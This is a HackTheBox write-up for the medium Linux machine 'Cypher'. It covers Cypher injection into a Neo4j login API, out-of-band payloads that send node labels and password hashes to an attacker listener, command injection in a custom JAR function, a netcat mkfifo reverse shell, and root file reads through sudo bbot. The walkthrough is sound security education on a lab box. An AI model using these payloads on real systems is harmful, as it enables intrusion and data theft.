---
title: "[EN] - HackTheBox: Cypher Write-Up"
date: 2025-03-03 11:07:00 +0700
categories: [HackTheBox, Boxes, Medium, Linux]
tags: [Cypher Injection, JAR Reversing, Bbot OSINT]
description: Cypher is a medium-difficulty Linux machine that requires exploiting a cypher injection vulnerability to bypass authentication on a login page. This grants users access to a custom web application to execute custom queries. A Java file is discovered by fuzzing the web application, revealing a command injection vulnerability that provides access to the machine as the neo4j user. A history file contains the credentials for the graphasm user, who has permission to execute bbot as root user. This privilege escalation is exploited by creating a custom module that allows executing commands.
image: /assets/img/HTB-Cypher_banner.png
---

## Enumeration

As usual, we start with an Nmap port scan to identify running services and understand the attack surface.

### Open TCP Ports

```shell
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/Cypher]
└──╼ [★]$ nmap -sVC -vv -T4 -p- -oN nmap/TCP_all_services.nmap 10.129.41.171
# Nmap <REDACTED> scan initiated Sat Mar  1 20:25:23 2025 as: nmap -sVC -vv -T4 -p- -oN nmap/TCP_all_services.nmap 10.129.41.171
Nmap scan report for 10.129.41.171
Host is up, received echo-reply ttl 63 (0.015s latency).
Scanned at 2025-03-01 20:25:24 CET for 7s
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 be:68:db:82:8e:63:32:45:54:46:b7:08:7b:3b:52:b0 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMurODrr5ER4wj9mB2tWhXcLIcrm4Bo1lIEufLYIEBVY4h4ZROFj2+WFnXlGNqLG6ZB+DWQHRgG/6wg71wcElxA=
|   256 e5:5b:34:f5:54:43:93:f8:7e:b6:69:4c:ac:d6:3d:23 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEqadcsjXAxI3uSmNBA8HUMR3L4lTaePj3o6vhgPuPTi
80/tcp open  http    syn-ack ttl 63 nginx 1.24.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://cypher.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Mar  1 20:25:31 2025 -- 1 IP address (1 host up) scanned in 8.10 seconds
```

Nmap returns only two open : **22 (SSH)** and **80 (HTTP)**. Since SSH rarely offers a direct attack surface, we focus our attention on port 80. 
The scan also reveals that the web server redirects to `http://cypher.htb/`, so we add that domain to our `/etc/hosts` file before proceeding.

```shell
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/Cypher]
└──╼ [★]$ echo "10.129.41.171 cypher.htb" | sudo tee -a /etc/hosts
10.129.41.171 cypher.htb
```

### Directory Listing

Next, we fuzz for hidden directories and endpoints using `ffuf`.

```shell
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/Cypher]
└──╼ [★]$ ffuf -ic -u http://cypher.htb/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt

<SNIP>

login            [Status: 200, Size: 3671, Words: 863, Lines: 127, Duration: 25ms]
index            [Status: 200, Size: 4562, Words: 1285, Lines: 163, Duration: 16ms]
about            [Status: 200, Size: 4986, Words: 1117, Lines: 179, Duration: 25ms]
demo             [Status: 307, Size: 0, Words: 1, Lines: 1, Duration: 19ms]
api              [Status: 307, Size: 0, Words: 1, Lines: 1, Duration: 22ms]
testing          [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 13ms]
                 [Status: 200, Size: 4562, Words: 1285, Lines: 163, Duration: 13ms]
:: Progress: [220546/220546] :: Job [1/1] :: 2380 req/sec :: Duration: [0:01:26] :: Errors: 0 ::
```

Several endpoints are returned. The most interesting one is `/testing`, which exposes a downloadable file ([custom-apoc-extension-1.0-SNAPSHOT.jar](http://cypher.htb/testing/custom-apoc-extension-1.0-SNAPSHOT.jar)).
Before reversing the JAR, we continue web enumeration and move on to the `/api` endpoint.

---

## Initial Access

### Cypher Injection in the API auth endpoint

While testing the API authentication endpoint, we send a generic injection probe, a single-quote followed by a comment sequence (`admin' --`) to see how the backend reacts to a broken query.<br><br>Rather than silently failing, the application returns a verbose Python traceback exposing a **Cypher syntax error**, which immediately tells us two things : the backend is **Neo4j** and the query language in use is **Cypher**, not SQL.

```shell
POST /api/auth HTTP/1.1
Host: cypher.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://cypher.htb/login
Content-Type: application/json
X-Requested-With: XMLHttpRequest
Content-Length: 53
Origin: http://cypher.htb
DNT: 1
Connection: keep-alive
Priority: u=0

{"username": "admin' --", "password": "anything"}
```

![](/assets/img/HTB-Cypher_1.png)

With the target database identified, we test for Cypher injection. Using an Out-Of-Band (OOB) payload, we instruct the database to make HTTP requests back to our listener, leaking the internal node labels in the process.

```shell
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/Cypher]
└──╼ [★]$ python3 -m http.server
```

Payload sent in the username field :

```shell
' OR 1=1 WITH 1 as a CALL db.labels() YIELD label LOAD CSV FROM 'http://<ATTACKER_IP>:8000/?'+label AS b RETURN b//
```

Received on our Python web server : 

```shell
10.129.41.171 - - [01/Mar/2025 22:29:21] "GET /?label=USER HTTP/1.1" 200 -
10.129.41.171 - - [01/Mar/2025 22:29:22] "GET /?label=HASH HTTP/1.1" 200 -
10.129.41.171 - - [01/Mar/2025 22:29:22] "GET /?label=DNS_NAME HTTP/1.1" 200 -
10.129.41.171 - - [01/Mar/2025 22:29:22] "GET /?label=SHA1 HTTP/1.1" 200 -
10.129.41.171 - - [01/Mar/2025 22:29:22] "GET /?label=SCAN HTTP/1.1" 200 -
10.129.41.171 - - [01/Mar/2025 22:29:22] "GET /?label=ORG_STUB HTTP/1.1" 200 -
10.129.41.171 - - [01/Mar/2025 22:29:22] "GET /?label=IP_ADDRESS HTTP/1.1" 200 -
```

With the injection confirmed, we craft a second OOB payload to extract **usernames** and **password** hashes from the database by traversing the `USER → SHA1` relationship.

```shell
{"username": "' OR 1=1 MATCH (u:USER)-[:SECRET]->(h:SHA1) LOAD CSV FROM 'http://<ATTACKER_IP>:8000/?user=' + COALESCE(u.name, 'unknown') + '&hash=' + COALESCE(h.value, 'nohash') as l RETURN 0 as _0 //", "password": "anything"}
```

Received on the web server :

```shell
10.129.41.171 - - [01/Mar/2025 23:53:27] "GET /?user=graphasm&hash=9f54ca4c130be6d529a56dee59dc2b2090e43acf HTTP/1.1" 200 -
```

Cracking the SHA1 hash yields no results, so we shift our focus to the `custom-apoc-extension-1.0-SNAPSHOT.jar` file found during directory enumeration.

### JAR File Reversing

We download the JAR to our attacking host and decompile it using `jd-gui`.

```shell
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/Cypher]
└──╼ [★]$ wget http://cypher.htb/testing/custom-apoc-extension-1.0-SNAPSHOT.jar  
--2025-03-01 20:59:20--  http://cypher.htb/testing/custom-apoc-extension-1.0-SNAPSHOT.jar
Resolving cypher.htb (cypher.htb)... 10.129.41.171
Connecting to cypher.htb (cypher.htb)|10.129.41.171|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 6556 (6,4K) [application/java-archive]
Saving to: ‘custom-apoc-extension-1.0-SNAPSHOT.jar’

custom-apoc-extension-1.0-SNAPS 100%[================================================>]   6,40K  --.-KB/s    in 0,01s   
2025-03-01 20:59:20 (577 KB/s) - ‘custom-apoc-extension-1.0-SNAPSHOT.jar’ saved [6556/6556]
```

```shell
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/Cypher]
└──╼ [★]$ java -jar /usr/local/bin/jd-gui.jar
```

![](/assets/img/HTB-Cypher_2.png)

The `getUrlStatusCode` function takes a URL as a parameter (`@Name("url") String url`), prepends `https://` if no scheme is provided, then passes it directly into a shell command via string concatenation. 
The function returns the HTTP status code and handles errors by returning `0` on failure. Since the URL is concatenated into the shell command without any sanitisation, this is a clear **command injection** vulnerability.

### Calling the Custom Function via Cypher Injection

With both vulnerabilities identified (**Cypher injection** & **command injection** in `getUrlStatusCode`), we chain them together to get a reverse shell. 
We first verify that the custom function is reachable from a Cypher query by sending a callback to our listener.

Payload used :

```cypher
' OR 1=1 MATCH (u:USER) CALL custom.getUrlStatusCode('http://<ATTACKER_IP>:8000/?callFromCypher') YIELD statusCode RETURN 0 as _0 //
```

![](/assets/img/HTB-Cypher_3.png)

Received on our Python web server :

```shell
10.129.41.171 - - [02/Mar/2025 00:54:44] "GET /?callFromCypher HTTP/1.1" 200 -
```

We then confirm command injection and exfiltrate the output of `id` encoded in base64 via a second OOB request.

Payload used : 

```cypher
' OR 1=1 CALL custom.getUrlStatusCode('http://<ATTACKER_IP>:8000/;id|base64') YIELD statusCode LOAD CSV FROM 'http://<ATTACKER_IP>:8000/?output=' + statusCode as l RETURN 0 as _0 //
```

![](/assets/img/HTB-Cypher_4.png)

Received on our Python web server :

```shell
10.129.41.171 - - [02/Mar/2025 00:58:02] "GET /?output=200dWlkPTExMChuZW80aikgZ2lkPTExMShuZW80aikgZ3JvdXBzPTExMShuZW80aikK HTTP/1.1" 200 -
```

Decoding the base64 :

```shell
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/Cypher]
└──╼ [★]$ echo -n dWlkPTExMChuZW80aikgZ2lkPTExMShuZW80aikgZ3JvdXBzPTExMShuZW80aikK | base64 -d
uid=110(neo4j) gid=111(neo4j) groups=111(neo4j)
```

With code execution confirmed as `neo4j`, we proceed to catch a reverse shell.

### Getting a Reverse Shell

We set up a netcat listener and send the following reverse shell payload through the Cypher injection:

```shell
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/Cypher]
└──╼ [★]$ nc -lvnp 9001 
listening on [any] 9001 ...
```

Payload used :

```cypher
' OR 1=1 CALL custom.getUrlStatusCode('http://<ATTACKER_IP>:8000/;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/usr/bin/bash -i 2>&1|nc <ATTACKER_IP> 9001 >/tmp/f') YIELD statusCode LOAD CSV FROM 'http://<ATTACKER_IP>:8000/?output=' + statusCode as l RETURN 0 as _0 //
```

After sending the payload through the application :

![](/assets/img/HTB-Cypher_5.png)

The connection lands on our listener and we upgrade the shell to a fully interactive TTY using Python's `pty` module, then stabilise it with `stty raw -echo`.

```shell
<SNIP>

listening on [any] 9001 ...
connect to  from (UNKNOWN) [10.129.41.171] 34904
bash: cannot set terminal process group (1410): Inappropriate ioctl for device
bash: no job control in this shell
neo4j@cypher:/$ which python3
which python3
/usr/bin/python3
neo4j@cypher:/$ python3 -c 'import pty;pty.spawn("/bin/bash");'
python3 -c 'import pty;pty.spawn("/bin/bash");'
neo4j@cypher:/$ ^Z
[1]+  Stopped                 nc -lvnp 9001

┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/Cypher]
└──╼ [★]$ stty raw -echo; fg;
nc -lvnp 9001
neo4j@cypher:/$ export TERM=xterm
neo4j@cypher:/$ alias ll='ls -lah --color'
```

---
## Privilege Escalation

### Neo4j -> Graphasm

As the `neo4j` user, we begin by identifying other accounts on the system and found the `graphasm` user (the username we already extracted from the Neo4j database).

```shell
neo4j@cypher:/$ cat /etc/passwd | grep 'home' | cut -f1 -d:
graphasm
```

Checking the environment variables reveals that `neo4j`'s home directory is `/var/lib/neo4j`.

```shell
neo4j@cypher:/$ env
SHELL=/bin/bash
NEO4J_HOME=/var/lib/neo4j
MEMORY_PRESSURE_WRITE=c29tZSAyMDAwMDAgMjAwMDAwMAA=
PWD=/
LOGNAME=neo4j
SYSTEMD_EXEC_PID=1410
HOME=/var/lib/neo4j
LANG=en_US.UTF-8

<SNIP>
```

Inspecting that directory, we notice that `.bash_history` is **not** redirected to `/dev/null`, meaning the command history may still be intact.

```shell
neo4j@cypher:/$ ll /var/lib/neo4j
total 56K
drwxr-xr-x 11 neo4j adm   4.0K Mar  2 00:15 .
drwxr-xr-x 50 root  root  4.0K Feb 17 16:48 ..
-rw-r--r--  1 neo4j neo4j   63 Oct  8 18:07 .bash_history
drwxrwxr-x  3 neo4j adm   4.0K Oct  8 18:07 .cache
drwxr-xr-x  2 neo4j adm   4.0K Aug 16  2024 certificates
drwxr-xr-x  6 neo4j adm   4.0K Oct  8 18:07 data
drwxr-xr-x  2 neo4j adm   4.0K Aug 16  2024 import
drwxr-xr-x  2 neo4j adm   4.0K Feb 17 16:24 labs
-rw-------  1 neo4j neo4j   20 Mar  2 00:15 .lesshst
drwxr-xr-x  2 neo4j adm   4.0K Aug 16  2024 licenses
-rw-r--r--  1 neo4j adm     52 Oct  2 15:55 packaging_info
drwxr-xr-x  2 neo4j adm   4.0K Feb 17 16:24 plugins
drwxr-xr-x  2 neo4j adm   4.0K Feb 17 16:24 products
drwxr-xr-x  2 neo4j adm   4.0K Mar  1 19:03 run
lrwxrwxrwx  1 neo4j adm      9 Oct  8 18:07 .viminfo -> /dev/null
```

Reading it reveals a password that was set during initial Neo4j configuration.

```shell
neo4j@cypher:/$ cat /var/lib/neo4j/.bash_history 
neo4j-admin dbms set-initial-password cU4bXXXXXXXXXXXXXXXmerhK
```

Testing that password against the `graphasm` account succeeds, granting us user-level access and the first flag.

```shell
neo4j@cypher:/$ su graphasm
Password:
graphasm@cypher:/$ id
uid=1000(graphasm) gid=1000(graphasm) groups=1000(graphasm)
graphasm@cypher:~$ cat ~/user.txt 
ef32XXXXXXXXXXXXXXXXXXXXXXXd2d06
```

---

### Graphasm -> Root

Listing `graphasm`'s sudo privileges shows that the `bbot` OSINT tool can be run as root without a password.

```shell
graphasm@cypher:~$ sudo -l
Matching Defaults entries for graphasm on cypher:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User graphasm may run the following commands on cypher:
    (ALL) NOPASSWD: /usr/local/bin/bbot

graphasm@cypher:~$ /usr/local/bin/bbot --version
  ______  _____   ____ _______
 |  ___ \|  __ \ / __ \__   __|
 | |___) | |__) | |  | | | |
 |  ___ <|  __ <| |  | | | |
 | |___) | |__) | |__| | | |
 |______/|_____/ \____/  |_|
 BIGHUGE BLS OSINT TOOL v2.1.0.4939rc

www.blacklanternsecurity.com/bbot

v2.1.0.4939rc
```

After reviewing `bbot`'s available flags, we find that combining the `-t` flag (which accepts a file path as a scan target) with the `-d` (debug) flag causes `bbot` to parse the file's contents and leak them in its verbose debug output, notably as part of the regex pattern it generates for the provided target. 

Since the binary runs as root, this lets us read `/root/root.txt` directly.

```shell
graphasm@cypher:~$ sudo /usr/local/bin/bbot -t /root/root.txt -d
  ______  _____   ____ _______
 |  ___ \|  __ \ / __ \__   __|
 | |___) | |__) | |  | | | |
 |  ___ <|  __ <| |  | | | |
 | |___) | |__) | |__| | | |
 |______/|_____/ \____/  |_|
 BIGHUGE BLS OSINT TOOL v2.1.0.4939rc

www.blacklanternsecurity.com/bbot

[INFO] Reading targets from file: /root/root.txt
[DBUG] Preset bbot_cli_main: Adding module "txt" of type "output"

<SNIP>

[DBUG] internal.excavate: Including Submodule HostnameExtractor
[DBUG] Generated Regex [(([a-z0-9-]+\.)+6cebXXXXXXXXXXXXXXXXXXXXXXX825d8)] for domain 6cebXXXXXXXXXXXXXXXXXXXXXXX825d8
[DBUG] internal.excavate: Including Submodule JWTExtractor
[DBUG] internal.excavate: Including Submodule NonHttpSchemeExtractor

<SNIP>
```

Root flag : `6cebXXXXXXXXXXXXXXXXXXXXXXX825d8`

---

## Resources

- [https://exploit-notes.hdks.org/exploit/database/neo4j-pentesting/](https://exploit-notes.hdks.org/exploit/database/neo4j-pentesting/)
- [https://infosecwriteups.com/onlyforyou-htb-lfr-rce-cypher-injection-neo4j-graph-database-pip3-download-code-execution-7855193b3d5c](https://infosecwriteups.com/onlyforyou-htb-lfr-rce-cypher-injection-neo4j-graph-database-pip3-download-code-execution-7855193b3d5c)
- [https://www.ghostlulz.com/blog/cypher-injection-neo4j-graph-databases](https://www.ghostlulz.com/blog/cypher-injection-neo4j-graph-databases)
- [https://www.blacklanternsecurity.com/bbot/Stable/scanning/output/](https://www.blacklanternsecurity.com/bbot/Stable/scanning/output/)